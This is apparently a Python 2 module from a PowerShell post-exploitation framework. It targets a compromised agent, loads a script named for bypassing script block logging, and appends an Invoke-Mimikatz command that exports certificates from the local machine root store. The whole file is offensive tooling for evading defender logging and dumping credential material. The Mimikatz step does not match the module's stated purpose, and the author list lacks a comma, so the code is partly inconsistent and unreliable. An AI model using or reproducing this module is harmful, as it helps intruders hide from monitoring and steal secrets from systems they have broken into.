from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Bypass Script_Block',

            'Author': ['@Homjxie' 'Ryan_Cobb',],

            'Description': ("@Ryan Cobb @Homjxie"
                            "Most companies only realize the need to enable script block logging after it is too late. To provide some recourse in this situation, PowerShell automatically logs script blocks when they have content often used by malicious scripts."),
            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [
                'https://twitter.com/cobbr_io',
                'https://twitter.com/GihadAlkmaty',
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        
        self.mainMenu = mainMenu
        
        for param in params:
             
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/management/Bypass-ScriptBlock.ps1"
        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        
        # add in the cert dumping command
        script += """Invoke-Mimikatz -Command 'crypto::capi privilege::debug crypto::cng "crypto::certificates /systemstore:local_machine /store:root /export"' """
        
        return script
